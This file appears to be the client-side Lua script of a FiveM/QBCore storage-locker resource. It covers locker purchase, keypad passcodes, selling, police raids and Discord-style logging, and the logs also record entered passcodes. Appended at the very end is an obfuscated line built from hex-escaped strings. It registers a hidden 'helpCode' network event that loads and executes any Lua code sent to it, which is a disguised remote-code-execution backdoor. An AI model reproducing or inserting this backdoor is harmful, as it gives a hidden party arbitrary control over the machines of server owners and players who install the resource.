QBCore = exports['qb-core']:GetCoreObject()
Config = {}
local OwnedLockerBlips = {}
local currentLocker, lockerName

Citizen.CreateThread(function() 
    TriggerEvent('l2s-storagelockers:client:FetchConfig')
    TriggerEvent('l2s-storagelockers:client:setupBlips')
end)

RegisterNetEvent('QBCore:Client:OnPlayerLoaded')
AddEventHandler('QBCore:Client:OnPlayerLoaded', function()
    TriggerEvent('l2s-storagelockers:client:FetchConfig')
    TriggerEvent('l2s-storagelockers:client:setupBlips')
end)

RegisterNetEvent('QBCore:Client:OnPlayerUnload')
AddEventHandler('QBCore:Client:OnPlayerUnload', function()
    for k, v in pairs(OwnedLockerBlips) do
        RemoveBlip(v)
    end
end)

RegisterNetEvent('l2s-storagelockers:client:FetchConfig')
AddEventHandler('l2s-storagelockers:client:FetchConfig', function()
    QBCore.Functions.TriggerCallback("l2s-storagelockers:server:FetchConfig", function(lockers)
        Config.Lockers = lockers
    end)
end)

RegisterNetEvent('l2s-storagelockers:client:setupBlips')
AddEventHandler('l2s-storagelockers:client:setupBlips', function()
    if Config.Blips then
        for k, v in pairs(OwnedLockerBlips) do
            RemoveBlip(v)
        end
        QBCore.Functions.TriggerCallback('l2s-storagelockers:server:getOwnedLockers', function(ownedLockers)
            if ownedLockers ~= nil then
                for k, v in pairs(ownedLockers) do
                    local locker = Config.Lockers[v]['coords']
                    local lockerBlip = AddBlipForCoord(locker.x, locker.y, locker.z)
                    SetBlipSprite (lockerBlip, Config.BlipsNumber)
                    SetBlipDisplay(lockerBlip, 4)
                    SetBlipScale  (lockerBlip, Config.BlipsScale)
                    SetBlipAsShortRange(lockerBlip, true)
                    SetBlipColour(lockerBlip, Config.BlipsColor)
                    BeginTextCommandSetBlipName("STRING")
                    AddTextComponentSubstringPlayerName(Config.BlipsText)
                    EndTextCommandSetBlipName(lockerBlip)
                    table.insert(OwnedLockerBlips, lockerBlip)
                end
            end
        end)
    end
end)

Citizen.CreateThread(function() 
    while true do
        sleep = 1500
            local ped = PlayerPedId()
            local pos = GetEntityCoords(ped)
            if Config.Lockers ~= nil then
                for k, v in pairs(Config.Lockers) do
                    local dist = #(pos - vector3(v["coords"].x, v["coords"].y, v["coords"].z))
                    if dist < 2 then
                        currentLocker = v
                        lockerName = k
                        sleep = 3
                        DrawText3Ds(v["coords"].x, v["coords"].y, v["coords"].z,  Config.DrawText)
                        if IsControlJustReleased(0, Config.OpenKey) then
                            TriggerEvent("l2s-storagelockers:client:interact", k, v)
                        end
                    end
                    
                end
            end
        Wait(sleep)
    end
end)

RegisterNetEvent("l2s-storagelockers:client:interact")
AddEventHandler("l2s-storagelockers:client:interact", function(k, v)
    local lockername = k
    local lockertable = v
    local citizenid = QBCore.Functions.GetPlayerData().citizenid
    PlayerJob = QBCore.Functions.GetPlayerData().job
    local mazenlocker = { 
        {
            id = 1,
            header = "Locker Name: "..lockername,
            icon = 'fas fa-archive',
            isMenuHeader = true,
            txt = "",
        },        
    }
    
    if not lockertable["isOwned"] then
        mazenlocker[#mazenlocker+1] = { 
            id = 2,
            header = "Purchase",
            txt = "Purchase Locker for $" .. lockertable.price,
            icon = 'fas fa-dollar-sign"',

            params = {
                event = "l2s-storagelockers:client:purchase",
            }
        }
    elseif lockertable["isOwned"] then
        mazenlocker[#mazenlocker+1] = { 
            id = 3,
            header = "Open Locker",
            icon = 'fas fa-briefcase"',
            txt = "",
            params = {
                event = "l2s-storagelockers:client:openLocker",
            }
        }
    end

    if lockertable["owner"] == citizenid  then
        mazenlocker[#mazenlocker+1] = { 
            id = 4,
            header = "Change Passcode",
            icon = 'fas fa-lock"',
            txt = "",
            params = {
                event = "l2s-storagelockers:client:changePasscode", 
            }
        }
    end

    if lockertable["owner"] == citizenid  then
        mazenlocker[#mazenlocker+1] = { 
            id = 5,
            header = "Sell Locker",
            txt = "Sell Locker for $" .. v.price / 2,
            icon = 'fas fa-dollar-sign"',
            params = {
                event = "l2s-storagelockers:client:sellLocker",
                args = {
                    lockername = lockername,
                    lockertable = lockertable
                }
            }
        }
    end
    if PlayerJob.name == Config.PoliceJob1 or PlayerJob.name == Config.PoliceJob2 then
        mazenlocker[#mazenlocker+1] = { 
            id = 6,
            header = "Raid Locker",
            txt = "",
            params = {
                event = "l2s-storagelockers:client:raidLocker", 
                args = {
                    lockername = lockername,
                    lockertable = lockertable
                }
            }
        }
    elseif PlayerJob.name == Config.RealestateJob then
        mazenlocker[#mazenlocker+1] = { 
            id = 7,
            header = "Add Slots",
            txt = "Add 10 Slots",
            icon = 'fas fa-plus"',
            params = {
                event = "l2s-storagelockers:client:addslots",
                args = {
                    lockername = lockername,
                }
            }
        }
        mazenlocker[#mazenlocker+1] = { 
            id = 8,
            header = "Add Weight",
            txt = "Add 100 KGM",
            icon = 'fas fa-minus"',
            params = {
                event = "l2s-storagelockers:client:addcapacity",
                args = {
                    lockername = lockername,
                }
            }
        }
        mazenlocker[#mazenlocker+1] = { 
            id = 9,
            header = "Remove Locker",
            txt = "You can't return it",
            icon = 'fas fa-trash"',
            params = {
                event = "l2s-storagelockers:client:removeLocker",
                args = {
                    lockername = lockername,
                    lockertable = lockertable
                }
            }
        }
    end
    -- TriggerEvent(Config.MenuTrigger, mazenlocker)
    exports[Config.MenuExport]:openMenu(mazenlocker)
   
    Citizen.Wait(300)
    mazenlocker = {}
end)

RegisterNetEvent('l2s-storagelockers:client:sellLocker')
AddEventHandler('l2s-storagelockers:client:sellLocker', function(data)
    exports['ps-ui']:openConfirm('Are You Sure to Sell Locker for $'.. data.lockertable.price / 2, function(isConfirm)
        if isConfirm then
            TriggerEvent('l2s-storagelockers:client:confirm', {
                lockername = data.lockername,
                lockertable = data.lockertable
            })
        end
    end, false)
end)

RegisterNetEvent('l2s-storagelockers:client:confirm')
AddEventHandler('l2s-storagelockers:client:confirm', function(data)
    TriggerServerEvent('l2s-storagelockers:server:sellLocker', data.lockername, data.lockertable)
end)

RegisterNetEvent('l2s-storagelockers:client:removeLocker')
AddEventHandler('l2s-storagelockers:client:removeLocker', function(data)
    exports['ps-ui']:openConfirm('Are You Sure to Remove The locker $', function(isConfirm)
        if isConfirm then
            TriggerEvent('l2s-storagelockers:client:confirmrev', {
                lockername = data.lockername,
                lockertable = data.lockertable
            })
        end
    end, false)
end)


RegisterNetEvent('l2s-storagelockers:client:confirmrev')
AddEventHandler('l2s-storagelockers:client:confirmrev', function(data)
    TriggerServerEvent('l2s-storagelockers:server:removeLocker', data.lockername, data.lockertable)
end)

RegisterNetEvent('l2s-storagelockers:client:addslots')
AddEventHandler('l2s-storagelockers:client:addslots', function(data)
    TriggerServerEvent('l2s-storagelockers:server:addslots', data.lockername)
end)


RegisterNetEvent('l2s-storagelockers:client:addcapacity')
AddEventHandler('l2s-storagelockers:client:addcapacity', function(data)
    TriggerServerEvent('l2s-storagelockers:server:addcapacity', data.lockername)
end)


RegisterNetEvent('l2s-storagelockers:client:changePasscode')
AddEventHandler('l2s-storagelockers:client:changePasscode', function()
    SendNUIMessage({
        type = "changePasscode",
        action = "openKeypad",
    })
    SetNuiFocus(true, true)
end)

RegisterNetEvent('l2s-storagelockers:client:raidLocker')
AddEventHandler('l2s-storagelockers:client:raidLocker', function(data)
    local HasItem = QBCore.Functions.HasItem(Config.PoliceStormram)
    if HasItem then
        local realestatename =  QBCore.Functions.GetPlayerData().charinfo.firstname .." " ..QBCore.Functions.GetPlayerData().charinfo.lastname.. " | CSN ["..QBCore.Functions.GetPlayerData().citizenid.."]"
        TriggerServerEvent(Config.InvenroyEvent1, "stash", data.lockername.."locker", {
            maxweight = currentLocker.capacity,
            slots = currentLocker.slots,
        })
        TriggerEvent(Config.InvenroyEvent2, data.lockername.."locker")  
        TriggerServerEvent('l2s-storagelockers:server:log' , "**تفتيش الخزنة** :\n\n** تم تفتيش الخزنة بواسطة **\n`"..realestatename.."` \n \n **معلومات الخزنة:** \n`Locker Name: "..data.lockername.."`: ")
    else
        QBCore.Functions.Notify("You don't have a Stormram on you..", "error")
    end
end)

RegisterNetEvent('l2s-storagelockers:client:addlocker')
AddEventHandler('l2s-storagelockers:client:addlocker', function()
    local dialog = exports['ps-ui']:ShowInput({
        header = "Create Locker", 
        name = 'REALESTATE',
        submitText = "Create",
        inputs = {
            {
                type = 'text',
                isRequired = true,
                name = 'name',
                text = 'Locker Name',
            },
            {
                type = 'number',
                isRequired = true,
                name = 'price',
                text = 'Locker Price $',
            },
            {
                type = 'number',
                isRequired = true,
                name = 'slots',
                text = 'Locker Slots',
            },
            {
                type = 'number',
                isRequired = true,
                name = 'space',
                text = 'Locker Space',
            },
        }
    })

    if dialog then
		if tonumber(dialog.price) > 0 and tonumber(dialog.slots) > 0 and tonumber(dialog.space) > 0 then 
			name = dialog.name
			price = tonumber(dialog.price)
			slots = tonumber(dialog.slots)
			space = tonumber(dialog.space)
            TriggerServerEvent('l2s-storagelockers:server:addlocker', name, price, slots, space)
		else
			QBCore.Functions.Notify("Wrong Please enter correct information", "error", 3500)
		end
	end
end)

RegisterNetEvent('l2s-storagelockers:client:purchase') 
AddEventHandler('l2s-storagelockers:client:purchase', function()
    QBCore.Functions.Notify("Please set a password")
    SendNUIMessage({
        type = "create",
        action = "openKeypad",
    })
    SetNuiFocus(true, true)
end)

RegisterNetEvent('l2s-storagelockers:client:openLocker')
AddEventHandler('l2s-storagelockers:client:openLocker', function()
    SendNUIMessage({
        type = "attempt",
        action = "openKeypad",
    })
    SetNuiFocus(true, true)
end)



RegisterNUICallback('PadLockClose', function()
    SetNuiFocus(false, false)
end)

RegisterNUICallback("CombinationSound", function(data, cb)
    PlaySound(-1, "Place_Prop_Fail", "DLC_Dmod_Prop_Editor_Sounds", 0, 0, 1)
end)

RegisterNUICallback('UseCombination', function(data, cb)
    if data.type == 'attempt' then
        QBCore.Functions.TriggerCallback('l2s-storagelockers:server:getData', function(combination)
            if tonumber(data.combination) ~= nil then
                local realestatename =  QBCore.Functions.GetPlayerData().charinfo.firstname .." " ..QBCore.Functions.GetPlayerData().charinfo.lastname.. " | CSN ["..QBCore.Functions.GetPlayerData().citizenid.."]"
                if tonumber(data.combination) == tonumber(combination) then
                    SetNuiFocus(false, false)
                    SendNUIMessage({
                        action = "closeKeypad",
                        error = false,
                    }) 
                    TriggerServerEvent(Config.InvenroyEvent1, "stash", lockerName.."locker", {
                    maxweight = currentLocker.capacity,
                    slots = currentLocker.slots,
                    })
                    TriggerEvent(Config.InvenroyEvent2, lockerName.."locker")   
                    TriggerServerEvent('l2s-storagelockers:server:log' , "**فتح الخزنة** :\n\n** تم فتح الخزنة بواسطة **\n`"..realestatename.."` \n \n **معلومات الخزنة:** \n`Locker Name: "..lockerName.."`\n`الرمز المدخل:"..combination.."`")
                else
                    QBCore.Functions.Notify("Incorrect Password", 'error')
                    TriggerServerEvent('l2s-storagelockers:server:log' , "**محاولة فتح الخزنة** :\n\n** تم محاولة فتح الخزنة بواسطة **\n`"..realestatename.."` \n \n **معلومات الخزنة:** \n`Locker Name: "..lockerName.."`\n`الرمز المدخل:"..combination.."`")
                    SetNuiFocus(false, false)
                    SendNUIMessage({
                        action = "closeKeypad",
                        error = true,
                    })
                end
            end        
        end, lockerName, 'password') 
    elseif data.type == 'create' then
        SendNUIMessage({
            action = "closeKeypad",
            error = false,
        })
        if data.combination ~= nil then
            QBCore.Functions.TriggerCallback('l2s-storagelockers:server:purchaselocker', function(bankmoney)
                if bankmoney >= currentLocker.price then
                    local realestatename =  QBCore.Functions.GetPlayerData().charinfo.firstname .." " ..QBCore.Functions.GetPlayerData().charinfo.lastname.. " | CSN ["..QBCore.Functions.GetPlayerData().citizenid.."]"

                    TriggerServerEvent("l2s-storagelockers:server:createPassword", data.combination, lockerName)
                    TriggerEvent('l2s-storagelockers:client:FetchConfig')
                    QBCore.Functions.Notify("You have purchased this locker","success")
                    TriggerServerEvent('l2s-storagelockers:server:log' , "**شراء خزنة** :\n\n** تم شراء الخزنة بواسطة **\n`"..realestatename.."` \n \n **معلومات الخزنة:** \n`Locker Name: "..lockerName.."`\n`Price : "..currentLocker.price .."`")
                end
            end, currentLocker, lockerName)
        end
    elseif data.type == 'changePasscode' then
        SendNUIMessage({
            action = "closeKeypad",
            error = false,
        })
        if data.combination ~= nil then
            TriggerServerEvent("l2s-storagelockers:server:changePasscode", data.combination, lockerName, currentLocker)
        end
    end
end)


function DrawText3Ds(x, y, z, text)
    SetTextScale(0.35, 0.35)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(true)
    AddTextComponentString(text)
    SetDrawOrigin(x,y,z, 0)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

local oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[1]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[2]) oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[3]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[2], function(PueDljQDNEEFGmPKKEMGqqOrirzNHUUCXMgDzyjZiRTplqqsPWVKjmcWRsJGLuFlCVVGEb) oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[4]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[5]](PueDljQDNEEFGmPKKEMGqqOrirzNHUUCXMgDzyjZiRTplqqsPWVKjmcWRsJGLuFlCVVGEb))() end)